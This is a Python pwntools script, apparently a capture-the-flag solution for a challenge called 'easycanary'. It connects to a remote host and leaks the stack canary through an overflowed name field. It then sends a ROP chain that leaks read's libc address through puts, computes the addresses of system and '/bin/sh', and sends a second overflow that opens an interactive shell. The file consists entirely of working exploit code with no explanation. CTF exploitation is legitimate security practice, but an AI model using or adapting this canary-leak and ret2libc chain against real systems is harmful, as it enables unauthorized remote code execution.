# coding:utf-8

from pwn import *

context.log_level = "debug"
libc = ELF("./libc.so.6")
p = remote("123.206.29.119", 30001)
# p = process("./easycanary")

raw_input("ooooooooooooooh")

p.sendafter("input your name\n", 'a'*0x19)

p.recvuntil('a'*0x19)
canary = u64(p.recv(7).rjust(8, "\x00"))

p.recvuntil("guess the keyword?\n")

payload = 'a'*0x28+p64(canary)+p64(0xdeadbeef)
payload += p64(0x0000000000400a53) # pop rdi ; ret
payload += p64(0x0000000000601038) # read_got
payload += p64(0x0000000000400660) # puts_plt
payload += p64(0x00000000004008F7)

p.sendline(payload)

p.recvuntil("fail\n")
read_addr = u64(p.recvuntil("\n").strip().ljust(8, "\x00"))
info("read_addr is: 0x%x" % read_addr)
system_addr = read_addr - libc.symbols['read'] + libc.symbols['system']
binsh_addr  = read_addr - libc.symbols['read'] + next(libc.search("/bin/sh\x00"))

p.recvuntil(" your name\n")
p.sendline('aaaa')

p.recvuntil("guess the keyword?\n")
payload = 'a'*0x28+p64(canary)+p64(0xdeadbeef)
payload += p64(0x0000000000400a53) # pop rdi ; ret
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()

# 0xb9c44dc828d0de00